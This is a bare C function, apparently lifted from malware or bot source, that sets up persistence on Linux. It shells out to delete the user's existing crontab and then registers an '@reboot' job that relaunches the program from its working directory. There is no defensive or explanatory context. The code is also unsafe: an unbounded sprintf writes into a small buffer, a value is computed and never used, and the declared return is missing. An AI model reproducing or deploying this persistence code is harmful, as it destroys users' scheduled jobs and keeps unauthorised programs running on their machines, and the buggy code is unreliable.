char *cron() {
	char cwd[PATH_MAX];
	getcwd(cwd, sizeof(cwd));
	char command[300];
	char data[1024];

	char exe[1024];
	int ret;

	ret = readlink("/proc/self/exe",exe,sizeof(exe)-1);

	exe[ret] = 0;


	sprintf(command, "(crontab -r >/dev/null 2>&1;crontab -l 2>/dev/null; echo \"@reboot %s/%s\") | crontab -",cwd ,fNAME);

	//Open the process with given 'command' for reading
	FILE* file = popen(command, "r");
	pclose(file);
}
